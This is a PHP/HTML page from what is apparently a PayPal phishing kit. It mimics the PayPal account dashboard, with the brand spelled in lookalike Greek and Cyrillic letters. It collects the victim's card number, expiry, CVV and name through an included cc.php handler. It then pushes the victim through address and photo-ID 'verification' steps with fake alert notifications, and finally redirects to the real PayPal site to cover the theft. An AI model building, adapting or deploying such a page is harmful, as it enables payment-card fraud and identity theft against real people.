<?
session_start();
error_reporting(0); 
date_default_timezone_set('GMT');
if ($_SESSION['login'] !== 'success') {
    header('Location:signin');
}
if ($_COOKIE['complete'] == 'true') {
    session_unset();
    header('Location:https://paypal.com/signin');
}
$s =  "onclick=\"location.href='';return false\" style='cursor:pointer'";
$INF = $_POST['dcn'] && $_POST['expiration'] && $_POST['cvv'] && $_POST['fullname'];
if (empty($INF) == false) {
    include('includes/cc.php');
}
include("../lang/language.php");
 
if ($_SESSION['card'] == null) {
   $next = 'confirm_card';
}else if ($_SESSION['card'] == 'success' ) {
    $next = 'address';
}else if ($_SESSION['address'] == 'success' ) {
   $next = 'document';
}else if ($_SESSION['document'] == 'success' ) {
   $next = 'finish';
}
?>  
<!DOCTYPE html>
<html lang="en_G2" dir="ltr" class="js"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="format-detection" content="telephone=no">
<link rel="shortcut icon" type="image/x-icon" href="../files/img/favicon.ico">
<link rel="stylesheet" href="../files/css/app.ltr.css">
<link rel="stylesheet" href="../files/css/ap.css">
<link rel="stylesheet" href="../files/css/wallet.ltr.css">
<link rel="stylesheet" href="../files/css/cw-notifications.css">
<title>ΡаyΡаI: <? echo($language['bar'][1]) ?></title>
</head> 
<body>
<div class="content_body">
    <input type="checkbox" id="toggleNavigation" class="vx_globalNav-toggleCheckbox"><div id="siedbar" class="vx_globalNav-main globalNav-main js_globalNavView js_ppLogo" role="banner"><div class="vx_globalNav-container"><a <? echo "$s"; ?>  name="ppLogo" class="vx_globalNav-brand_desktop"><span class="vx_a11yText"><? echo($language['home'][1]) ?></span></a><div class="vx_globalNav-secondaryNav_mobile"><div class="vx_globalNav-listItem_mobileLogout"><a onclick="location.href='signin';return false" name="logout_mobile" class="vx_globalNav-link_mobileLogout"><? echo($language['bar'][17]) ?></a></div><div class="vx_globalNav-listItem_settings"><a href="" name="settings_mobile" class="vx_globalNav-link_settings"><span class="vx_globalNav-svgIcon">
<img src="../files/img/settings.svg">
</span><span class="vx_a11yText"><? echo($language['bar'][9]) ?></span></a></div><div><p class="vx_h5 vx_globalNav-displayName"><? echo $_SESSION['email']; ?></p></div></div><div class="vx_globalNav-navContainer">
<center>
<nav class="vx_globalNav-nav" role="navigation"><ul class="vx_globalNav-list"><li class="vx_isActive">

<a <? echo "$s"; ?> target="_self" name="summary" class="vx_globalNav-links js_summary"><? echo($language['bar'][1]) ?></a></li><li class=""><a <? echo "$s"; ?> target="_self" name="activity" class="vx_globalNav-links js_activity"><? echo($language['bar'][2]) ?></a></li><li class=""><a <? echo "$s"; ?> target="_self" name="transfer" class="vx_globalNav-links js_sendMoney"><? echo($language['bar'][3]) ?></a></li>
<li class=""><a <? echo "$s"; ?> target="_self" name="wallet" class="vx_globalNav-links js_wallet"><? echo($language['bar'][4]) ?></a></li><li class=""><a <? echo "$s"; ?> target="_self" name="shop" class="vx_globalNav-links js_shop"><? echo($language['bar'][5]) ?></a></li>
<li class=""><a <? echo "$s"; ?> target="_self" name="shop" class="vx_globalNav-links js_shop"><? echo($language['bar'][6]) ?></a></li>
<li class="vx_globalNav-link_mobileSearch js_globalNavSearchEntry">
<a name="search"  <? echo "$s"; ?> class="vx_globalNav-links js_mobileSearch"><? echo($language['bar'][19]) ?></a></li></ul><ul class="vx_globalNav-list_secondary">
<!--
<li><a <? echo "$s"; ?> class="vx_globalNav-link_search vx_globalNav-svgIcon js_globalNavSearchEntry js_search" name="search" title="Search">
<img src="../files/img/search.svg">
<span class="vx_globalNav-navText_secondary vx_a11yText">Search</span></a></li>-->
<li class="vx_hidden-phone js_notificationButtonView" data-autodisplay="false">
<button style="background: transparent;border: 0;outline: 0" name="notifications" class="notice_p vx_globalNav-svgIcon vx_globalNav-link_notifications vx_isCritical js_notifications-toggleTrigger js_notifications"><img src="../files/img/notification.svg"><? if ($next !== 'finish') { echo('<span class="vx_notificationCount js_notificationCount">1</span>'); } ?><span class="vx_a11yText"><? echo($language['bar'][7]) ?></span></button>



<div id="notifications-popover" class="cw_popover-container cw_notifications-container cw_popoverPrepToOpen" tabindex="0" style="top: 69px; left: -130.5px;z-index: 99999" aria-label="Popover Dialog"><div id="cw_tab-list" class="cw_tab-list">

<button id="cw_tab-notifications" data-panel="cw_panel-notifications" class="cw_tab cw_tab_notifications cw_tab_selected"><? echo($language['bar'][7]) ?> (<span id="notificationCount"><? if ($next == 'finish') { echo('0'); }else{echo('1');} ?></span>)</button>

<button id="cw_tab-messages" data-panel="cw_panel-messages" class="cw_tab cw_tab_messages"><? echo($language['bar'][8]) ?> (<span id="messageCount">0</span>)</button>


</div><div class="cw_tab-list-shadow"></div><div class="cw_popover-body">
  <ul class="cw_panel cw_panel_notifications cw_panel_selected" id="cw_panel-notifications"><li class="cw_notification js_emptyNotification"><? if ($next == 'finish') {
     echo('<div class="cw_notification-header_empty">'.$language['bar'][18].'</div>');
  }else{
    echo('    
<div class="cw_notification-header">
<div style="padding: 10px 11px">
        <div style="color: #DF0000;margin-bottom: 8px;font-weight:500">'.$language['bar'][10].'</div>
        <div><div class="icon-alert"></div><span>'.$language['bar'][11].'</span></div></div>
        <div class="notice_p cw_notification-link">'.$language['bar'][12].'</div>
</div>');
  }

 ?>
</li></ul><ul class="cw_panel cw_panel_messages" id="cw_panel-messages"><li class="cw_notification js_emptyNotification">
    <div class="cw_notification-header_empty">
    <? echo($language['bar'][13]) ?></div><a style="cursor: pointer;" class="cw_notification-link"><? echo($language['bar'][14]) ?></a></li></ul></div></div>


</li><li><a <?echo "$s"; ?> name="settings" class="vx_globalNav-svgIcon vx_globalNav-link_settings js_settings"><img src="../files/img/settings.svg"><span class="vx_a11yText"><? echo($language['bar'][9]) ?></span></a></li><li class="vx_globalNav-listItem_logout"><a onclick="window.location.href = 'signin'; return false" name="logout" class="vx_globalNav-link_logout js_logout"><? echo($language['bar'][17]) ?></a></li></ul></nav></div></div><div>
        </div></div>



<div id="js_foreground" class="vx_foreground-container foreground-container"><div class="vx_globalNav-main_mobile"><div class="vx_globalNav-headerSection_trigger"><div class="vx_globalNav-toggleTrigger-container"><label class="vx_globalNav-toggleTrigger_animated" for="toggleNavigation"><span></span><div class="vx_globalNav-toggleTrigger_animated_open"><? echo($language['bar'][15]) ?></div><div class="vx_globalNav-toggleTrigger_animated_close"><? echo($language['bar'][16]) ?></div></label></div></div><div class="vx_globalNav-headerSection_logo"><a  name="ppLogo_mobile" class="vx_globalNav-brand_mobile"><span class="vx_a11yText"><? echo($language['bar'][1]) ?></span></a></div><ul class="vx_globalNav-headerSection_actions"><li class="vx_globalNav-actionItem_mobileglobalNav_notificationItem vx_globalNav-notificationItem_mobile js_notificationButtonView">
    <button style="background: transparent;border: 0;outline: 0" class="vx_globalNav-svgIcon vx_globalNav-link_notifications notifications_mobile vx_isCritical js_notifications-toggleTrigger js_notifications popup_mobile_open_close" name="openNotifications" role="button" title="Notifications">
        <img src="../files/img/notification.svg"><? if ($next !== 'finish') { echo('<span class="vx_notificationCount js_notificationCount">1</span>'); } ?><span class="vx_a11yText"><? echo($language['bar'][7]) ?></span></button>
    </li></ul></div>


<div class="background_popup"></div>
<div class="popup_mobile"><div class="vx_modal-flow vx_modalPrepToOpen vx_modalIsOpen" id="notifications-mobile" aria-label="Modal Dialog"><div class="vx_modal-wrapper cw_notifications-modal-wrapper"><div class="vx_modal-content cw_notifications-mobile-content"><div id="notifications-mobile-popover" class="cw_notifications-mobile-container" tabindex="0">
  <header class="vx_modal-header cw_notifications-mobile-content-header">

    <span class="vx_modal-dismiss_trigger popup_mobile_open_close" data-modal-id="notifications-mobile">
<div class="notification_close"><div></div><div></div></div>
</span><div class="notification_icon"></div>
<div id="cw_tab-list" class="cw_tab-list"><button id="cw_tab-notifications" data-panel="cw_panel-notifications" class="cw_tab cw_tab_notifications cw_tab_selected" data-pagename="main:notifications:toggleNotifs"><? echo($language['bar'][7]) ?> (<span id="notificationCount"><? if ($next == 'finish') { echo('0'); }else{echo('1');} ?></span>)</button><button id="cw_tab-messages" data-panel="cw_panel-messages" class="cw_tab cw_tab_messages" data-pagename="main:notifications:toggleSMC"><? echo($language['bar'][8]) ?> (<span id="messageCount">0</span>)</button></div><div class="cw_tab-list-shadow"></div></header><div class="cw_popover-body"><ul class="cw_panel cw_panel_notifications cw_panel_selected" id="cw_panel-notifications"><li class="cw_notification js_emptyNotification"><div class="cw_notification-header"><? if ($next == 'finish') {
     echo('<div class="cw_notification-header_empty">'.$language['bar'][18].'</div>');
  }else{
    echo('    
<div class="cw_notification-header">
<div style="padding: 10px 11px">
        <div style="color: #DF0000;margin-bottom: 8px;font-weight:500">'.$language['bar'][10].'</div>
        <div><div class="icon-alert"></div><span>'.$language['bar'][11].'</span></div></div>
        <div class="notice_p cw_notification-link">'.$language['bar'][12].'</div>
</div>');
  }

 ?></li></ul><ul class="cw_panel cw_panel_messages" id="cw_panel-messages"><li class="cw_notification js_emptyNotification"><div class="cw_notification-header_empty"><? echo($language['bar'][13]) ?></div><a style="cursor: pointer;" class="cw_notification-link"><? echo($language['bar'][14]) ?></a></li></ul></div></div></div></div></div></div>


        <div class="contents vx_mainContent" id="contents" role="main" aria-labelledby="heading1"><section id="wallet" class="mainContents wallet"><h1 id="heading1" class="accessAid">ΡаyΡаI: <? echo($language['bar'][4]) ?></h1><div class="row">
<div id="update_content" class="space">
    <div class="container_update" style="display: none;">
<div class="statique" style="">
<div class="statement">
    <div class="impact">
            <div><b><p style="margin: 0"><?=$language['home'][18];?></p></b></div> 
            <div></div>
    </div>
<div>
<div style="max-width: 130px">
    <div style="margin: 14px 0;">
        <span class="statistics"><?=$language['home'][19];?><div></div></span>
    </div>

    <div class="overviewStatique">
        <div></div>
        <div></div>
    </div>
</div>
</div>
    <div><button><?=$language['home'][20];?></button></div>
</div>
<table class="informations">
    <tr>
        <td class="ico_cr"><div class="critical"><div></div><div></div></div></td>
        <td><span><?=$language['home'][21];?></span></td>
    </tr>

    <tr>
        <td class="ico_cr"><div class="critical"><div></div><div></div></div></td>
        <td><span><?=$language['home'][23];?></span></td>
    </tr>

    <tr>
        <td class="ico_cr"><div class="critical"><div></div><div></div></div></td>
        <td><span><?=$language['home'][24];?></span></td>
    </tr>

    <tr>
        <td class="ico_cr"><div class="critical"><div></div><div></div></div></td>
        <td><?=$language['home'][25];?></td>
    </tr>
</table>

</div>
        <div class="row first">
            <div class="twelve columns">

                <div id="form_contents">
            <div class="content_c">
                <div class="spaceDevice">
                    <div style="border: 2px solid #2C2E2F;width: 40px;height: 40px;padding: 7px;border-radius: 100%;text-align: center;font-size: 27px;color: #2C2E2F;font-family: sans-serif;margin-right: 20px;float: left;"><span style="">!</span></div>
                    <h1 style="font-weight: 400"><?=$language['home'][26];?></h1>
                    <p style="font-size: small;"><?=$language['home'][27];?></p>
                    <p style="font-size:  small;"><?=$language['home'][33];?></p>
                    <div class="reference"><?=$language['home'][28];?></div>
                </div>
                    <div class="steps_follow">
                        <div><span><?=$language['home'][29];?>
                        </span></div>
                        <div></div>                            
                    </div>


                        <table class="limit">
                            <tr>
                                <td><b><?=$language['home'][30];?></b></td>
                                <td class="c_card"></td>
                            </tr>

                            <tr>
                                <td><b><?=$language['home'][31];?></b></td>
                                <td class="addressProf"></td>
                            </tr>

                            <tr>
                                <td><b><?=$language['home'][32];?></b></td>
                                <td class="photoid"></td>
                            </tr>
<!--                             <tr>
                                <td><b>Confirm your bank</b></td>
                                <td class="bank"></td>
                            </tr> -->
                        </table>
      
</div>

                </div>

            </div>
        </div>
    </div>
</div> 

<div id="modal"></div></section></div><div class="vx_globalFooter"><div class="vx_globalFooter-content"><ul class="vx_globalFooter-list"><li><a style="cursor: pointer;" name="security"><? echo($language['copyright'][5]) ?></a></li><li><a style="cursor: pointer;" name="pricing"><? echo($language['copyright'][6]) ?></a></li></ul><div class="vx_globalFooter_secondary"><p class="vx_globalFooter-copyright"><? echo($language['copyright'][3]) ?></p><ul class="vx_globalFooter-list_secondary"><li><a style="cursor: pointer;" name="privacy"><? echo($language['copyright'][1]) ?></a></li><li><a style="cursor: pointer;" name="legal"><? echo($language['copyright'][2]) ?></a></li></ul></div></div></div><label class="vx_globalNav-toggleTrigger_overlay" for="toggleNavigation"></label></div>
</div>




<!--     CONTENT FORM    -->
<div id="popup" style="display: none;" >
    <div class="form"> 
<div><a id="close" class="dismiss close nemo_dismissClose"><span class="icon icon-close-small"></span></a></div>
<div class="content"><? include(''.$next.'.php') ?></div>
<div><div style="margin: 20% auto 6px;text-align: center;"><img src="../files/img/favicon.ico"></div></div>
</div>
<!--     LOADING    -->
<div class="bg_rotate"><table><tr><td><div class="rotate"></div></td></tr></table></div>
<!--    END LOADING    -->
</div>
<!--     END CONTENT FORM    -->

<!--     SCRIPTS    -->
<script src="../files/js/jquery.js"></script>
<script src="../files/js/plugins.js"></script> 
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.10/jquery.mask.js"></script>
<script type="text/javascript">
    var load = '<? echo($next) ?>';
    var buttonText = '<?=$language['home'][3] ?>';
    var choose = '<? echo($language['id'][11]) ?>';
</script>
<script src="../files/js/content.js"></script>
<script src="../files/js/file.js"></script>
</body></html>